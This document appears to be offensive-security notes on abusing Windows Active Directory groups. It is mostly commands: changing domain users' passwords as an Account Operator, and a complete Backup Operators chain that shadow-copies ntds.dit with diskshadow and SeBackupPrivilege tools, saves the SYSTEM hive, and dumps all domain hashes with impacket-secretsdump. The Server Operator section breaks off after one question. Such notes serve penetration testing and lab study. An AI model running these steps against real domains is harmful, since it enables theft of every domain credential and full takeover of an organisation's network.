# Groups

### **ACCOUNT OPERATORS**

It can manage and create both administrator and non-administrator users, thus also changing the passwords of other users.

```powershell
net user <USER> NewPassword1234 /domain
```

### **BACKUP OPERATORS**

to dump ntds.dit we need to be able to back up the ntds.dit file, a file containing all the hashes and information of the domain. Download the following files:

* [SeBackupPrivilegeUtils.dll](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll)
* [SeBackupPrivilegeCmdLets.dll ](https://github.com/giuliano108/SeBackupPrivilege/raw/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll)

Create a file named diskshadow.txt containing these lines.

```vim
set context persistent nowriters #
set metadata c:\tmp\metadata.cab #
add volume c: alias myAlias #
create #
expose %myAlias% x: #
exec "cmd.exe" /c copy x:\windows\ntds\ntds.dit c:\tmp\ntds.dit #
delete shadows volume %myAlias% #
reset #
```

Create a folder named 'tmp' on the machine.

```powershell
mkdir c:\tmp
```

And upload all three files

```powershell
upload SeBackupPrivilegeCmdLets.dll
upload SeBackupPrivilegeUtils.dll
upload diskshadow.txt
```

Start DiskShadow

```powershell
diskshadow.exe /s c:\tmp\diskshadow.txt
```

<figure><img src="../../../.gitbook/assets/Pasted image 20230510125209.png" alt=""><figcaption></figcaption></figure>

Import the previously loaded modules and use the command.

```powershell
Set-SeBackupPrivilege
```

Copy the SYSTEM and NTDS.dit files and download them.

```powershell
reg save HKLM\SYSTEM c:\tmp\system
copy-filesebackupprivilege x:\windows\ntds\ntds.dit c:\tmp\ntds.dit -overwrite
```

Use IMPACKET's secretdump to dump the hashes and log in with evil-winrm.

```bash
impacket-secretsdump -ntds ntds.dit -system system local
```

### **SERVER OPERATOR**

Can you restart the services and modify their PATH?
